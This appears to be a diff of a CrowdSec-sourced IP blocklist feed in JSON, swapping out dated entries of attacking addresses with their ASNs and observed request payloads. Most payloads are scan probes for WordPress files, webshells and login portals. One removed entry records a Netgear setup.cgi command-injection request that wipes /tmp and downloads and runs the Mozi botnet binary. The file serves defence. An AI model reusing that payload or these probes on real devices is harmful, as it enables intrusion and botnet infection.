@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-08-06T01:00:00Z",
+  "generated_at": "2026-08-06T13:00:00Z",
   "ttl_days": 7,
   "scope": "all",
   "counts": {
@@ -8,137 +8,6 @@
     "v6": 0
   },
   "items": [
-    {
-      "ip": "135.119.63.61",
-      "family": "v4",
-      "first_seen": "2026-07-30T10:00:00Z",
-      "last_seen": "2026-07-30T10:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-wordpress-scan"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "135.119.0.0/16",
-      "payloads": [
-        "GET /admin.php",
-        "GET /wp-content/plugins/admin.php",
-        "GET /wp-admin/js/about.php",
-        "GET /geju.php",
-        "GET /wp-content/plugins/about.php",
-        "GET /wp.php",
-        "GET /aaa.php",
-        "GET /hoot.php",
-        "GET /about.php",
-        "GET /wp-content/db-cache.php",
-        "GET /wp-content/themes/twentyeleven/functions.php",
-        "GET /wp-content/themes/oceanwp/functions.php"
-      ]
-    },
-    {
-      "ip": "110.38.240.97",
-      "family": "v4",
-      "first_seen": "2026-07-30T04:00:00Z",
-      "last_seen": "2026-07-30T04:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "139879",
-      "asn_name": "GALAXY-AS-AP - Galaxy Broadband",
-      "asn_prefix": "110.38.240.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://110.38.240.97:55528/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "20.220.15.170",
-      "family": "v4",
-      "first_seen": "2026-07-30T03:00:00Z",
-      "last_seen": "2026-07-30T03:00:00Z",
-      "scenarios": [
-        "crowdsec/http-backdoors-attempts",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-probing",
-        "crowdsec/http-wordpress-scan"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.192.0.0/10",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /wso112233.php",
-        "GET /alfanew.php",
-        "GET /fw.php",
-        "GET /install.php",
-        "GET /wp-login.php",
-        "GET /wp-content/plugins/google-seo-rank/module.php",
-        "GET /css.php",
-        "GET /log.php",
-        "GET /inputs.php",
-        "GET /classsmtps.php",
-        "GET /wp-blog-header.php",
-        "GET /wp-trackback.php",
-        "GET /wp-signup.php",
-        "GET /wp-comments-post.php",
-        "GET /wp-cron.php",
-        "GET /wp-load.php",
-        "GET /wp-mail.php",
-        "GET /edit.php",
-        "GET /wp-activate.php"
-      ]
-    },
-    {
-      "ip": "172.105.23.218",
-      "family": "v4",
-      "first_seen": "2026-07-30T02:00:00Z",
-      "last_seen": "2026-07-30T02:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "63949",
-      "asn_name": "AKAMAI-LINODE-AP Akamai Connected Cloud",
-      "asn_prefix": "172.105.0.0/19",
-      "payloads": [
-        "GET /sonicui/7/sslvpn-portal/"
-      ]
-    },
-    {
-      "ip": "20.168.0.218",
-      "family": "v4",
-      "first_seen": "2026-07-30T02:00:00Z",
-      "last_seen": "2026-07-30T02:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.160.0.0/12",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /owa/auth/x.js"
-      ]
-    },
     {
       "ip": "18.232.121.80",
       "family": "v4",
@@ -2314,6 +2183,133 @@
         "GET /222.php",
         "GET /mac.php",
         "GET /ops.php"
+      ]
+    },
+    {
+      "ip": "77.91.71.6",
+      "family": "v4",
+      "first_seen": "2026-08-06T09:00:00Z",
+      "last_seen": "2026-08-06T09:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "211486",
+      "asn_name": "AAA-AS Alferov Aleksey Aleksandrovich",
+      "asn_prefix": "77.91.71.0/24",
+      "payloads": [
+        "GET /remote/login"
+      ]
+    },
+    {
+      "ip": "216.180.246.242",
+      "family": "v4",
+      "first_seen": "2026-08-06T06:00:00Z",
+      "last_seen": "2026-08-06T06:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "216.180.246.0/24",
+      "payloads": [
+        "GET /remote/login",
+        "GET /manage/account/login",
+        "GET /admin/index.html",
+        "GET /index.html",
+        "GET /+CSCOE+/logon.html",
+        "GET /cgi-bin/login.cgi",
+        "GET /login.htm",
+        "GET /login.html",
+        "GET /login.jsp",
+        "GET /login",
+        "GET /doc/index.html"
+      ]
+    },
+    {
+      "ip": "172.213.208.13",
+      "family": "v4",
+      "first_seen": "2026-08-06T02:00:00Z",
+      "last_seen": "2026-08-06T02:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "172.208.0.0/13",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /wp-content/plugins/hellopress/wp_filemanager.php",
+        "GET /this_is_a_new_hello_world.php",
+        "GET /err.php",
+        "GET /img.php",
+        "GET /aa.php",
+        "GET /av.php",
+        "GET /xa.php",
+        "GET /media.php",
+        "GET /images.php",
+        "GET /xp.php",
+        "GET /admin.php"
+      ]
+    },
+    {
+      "ip": "146.70.172.115",
+      "family": "v4",
+      "first_seen": "2026-08-06T01:00:00Z",
+      "last_seen": "2026-08-06T01:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "9009",
+      "asn_name": "M247 M247 Europe SRL",
+      "asn_prefix": "146.70.172.0/24",
+      "payloads": [
+        "GET /remote/login"
+      ]
+    },
+    {
+      "ip": "216.180.246.235",
+      "family": "v4",
+      "first_seen": "2026-08-06T01:00:00Z",
+      "last_seen": "2026-08-06T01:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "216.180.246.0/24",
+      "payloads": [
+        "GET /manage/account/login",
+        "GET /admin/index.html",
+        "GET /index.html",
+        "GET /+CSCOE+/logon.html",
+        "GET /cgi-bin/login.cgi",
+        "GET /login.htm",
+        "GET /login.html",
+        "GET /login.jsp",
+        "GET /login",
+        "GET /doc/index.html",
+        "GET /remote/login"
       ]
     }
   ]
